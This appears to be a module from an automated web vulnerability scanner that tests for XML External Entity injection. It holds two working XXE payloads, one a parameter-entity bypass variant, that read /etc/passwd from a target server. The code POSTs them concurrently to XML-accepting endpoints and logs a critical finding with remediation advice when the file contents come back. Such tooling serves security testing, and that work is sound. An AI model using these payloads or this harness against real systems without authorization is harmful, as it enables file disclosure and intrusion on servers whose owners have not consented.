"""
XXE — POST XML payloads to endpoints accepting XML; verify via OOB or
file disclosure (file:///etc/passwd).
"""
from __future__ import annotations
import asyncio
from typing import List
from core.engine import Finding

XXE_FILE = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""
XXE_BYPASS = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "data:text/plain,<!ENTITY &#37; exfil SYSTEM 'file:///etc/passwd'>"> %xxe; %exfil; ]>
<foo/>"""

async def run(http, waf, verifier, endpoints, targets, stack, findings_sink):
    findings = []
    sem = asyncio.Semaphore(8)

    async def _test(ep):
        async with sem:
            if "xml" not in ep.get("headers", {}).get("Content-Type", "").lower() and \
               "xml" not in ep["url"].lower(): return
            for payload in [XXE_FILE, XXE_BYPASS]:
                r = await http.arequest("POST", ep["url"], data=payload,
                                         headers={"Content-Type":"application/xml"})
                if r and "root:" in r.text and ":/bin/" in r.text:
                    findings.append(Finding(
                        title="XXE file disclosure (/etc/passwd)",
                        severity="critical", confidence=0.95,
                        category="ADV-XXE", endpoint=ep["url"], method="POST",
                        payload=payload, evidence=r.text[:300],
                        cwe="CWE-611",
                        remediation="Disable DTD processing; use safe XML parsers; "
                                    "validate input.",
                        tags=["xxe", "high-value"]
                    ))
                    return

    await asyncio.gather(*[_test(e) for e in endpoints], return_exceptions=True)
    return findings
